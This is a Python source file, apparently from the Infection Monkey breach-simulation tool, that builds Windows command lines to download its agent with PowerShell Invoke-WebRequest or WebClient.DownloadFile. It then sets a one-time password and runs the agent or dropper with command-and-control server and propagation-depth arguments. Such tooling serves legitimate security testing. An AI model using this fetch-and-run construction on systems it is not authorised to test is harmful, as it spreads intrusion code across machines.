from pathlib import PureWindowsPath
from typing import Optional, Sequence

from agentpluginapi import IAgentOTPProvider
from monkeytypes import AgentID

from infection_monkey.model import DROPPER_ARG, MONKEY_ARG

from .environment import DropperExecutionMode
from .i_windows_agent_command_builder import (
    IWindowsAgentCommandBuilder,
    WindowsDownloadMethod,
    WindowsDownloadOptions,
    WindowsRunOptions,
    WindowsShell,
)


class WindowsAgentCommandBuilder(IWindowsAgentCommandBuilder):
    def __init__(
        self,
        agent_id: AgentID,
        servers: Sequence[str],
        otp_provider: IAgentOTPProvider,
        agent_otp_environment_variable: str,
        current_depth: int = 0,
    ):
        self._agent_id = agent_id
        self._servers = servers
        self._otp_provider = otp_provider
        self._agent_otp_environment_variable = agent_otp_environment_variable
        self._current_depth = current_depth
        self._command = ""

    def build_download_command(self, download_options: WindowsDownloadOptions):
        download_command_func = self._build_download_command_webrequest
        if download_options.download_method == WindowsDownloadMethod.WEB_CLIENT:
            download_command_func = self._build_download_command_webclient

        if download_options.shell == WindowsShell.CMD:
            self._command += "cmd.exe /c "

        if download_options.shell == WindowsShell.POWERSHELL:
            self._command += "powershell "

        self._command += download_command_func(
            download_options.download_url, download_options.agent_destination_path
        )

    def _build_download_command_webrequest(
        self, download_url: str, destination_path: PureWindowsPath
    ) -> str:
        return (
            f"Invoke-WebRequest -Uri '{download_url}' "
            f"-OutFile '{destination_path}' -UseBasicParsing ; "
        )

    def _build_download_command_webclient(
        self, download_url: str, destination_path: PureWindowsPath
    ) -> str:
        return (
            "(new-object System.Net.WebClient)"
            f".DownloadFile(^''{download_url}^'' , ^''{destination_path}^'') ; "
        )

    def build_run_command(self, run_options: WindowsRunOptions):
        if self._command != "":
            if run_options.shell == WindowsShell.CMD:
                self._command += "cmd.exe /c"
        set_otp = self._set_otp_powershell
        # TODO: Make this explicit
        if run_options.shell == WindowsShell.CMD:
            set_otp = self._set_otp_cmd

        self._command += f"{set_otp()} {str(run_options.agent_destination_path)} "

        if run_options.dropper_execution_mode != DropperExecutionMode.SCRIPT:
            self._command += self._build_agent_run_arguments(run_options)

    def _set_otp_powershell(self) -> str:
        return f"$env:{self._agent_otp_environment_variable}='{self._otp_provider.get_otp()}' ; "

    def _set_otp_cmd(self) -> str:
        return f"set {self._agent_otp_environment_variable}={self._otp_provider.get_otp()}& "

    def _build_agent_run_arguments(self, run_options: WindowsRunOptions) -> str:
        agent_arg = MONKEY_ARG
        destination_path = None
        if run_options.dropper_execution_mode == DropperExecutionMode.DROPPER:
            agent_arg = DROPPER_ARG
            destination_path = (
                run_options.dropper_destination_path
                if run_options.dropper_destination_path
                else run_options.agent_destination_path
            )

        agent_arguments = self._build_agent_command_line_arguments(destination_path)
        return f"{agent_arg} {' '.join(agent_arguments)}"

    def _build_agent_command_line_arguments(
        self, destination_path: Optional[PureWindowsPath]
    ) -> list[str]:
        commandline = []

        if self._agent_id is not None:
            commandline.append("-p")
            commandline.append(str(self._agent_id))
        if self._servers:
            commandline.append("-s")
            commandline.append(",".join(self._servers))
        if self._current_depth is not None:
            commandline.append("-d")
            commandline.append(str(self._current_depth))
        if destination_path is not None:
            commandline.append("-l")
            commandline.append(str(destination_path))

        return commandline

    def get_command(self) -> str:
        return self._command

    def reset_command(self):
        self._command = ""
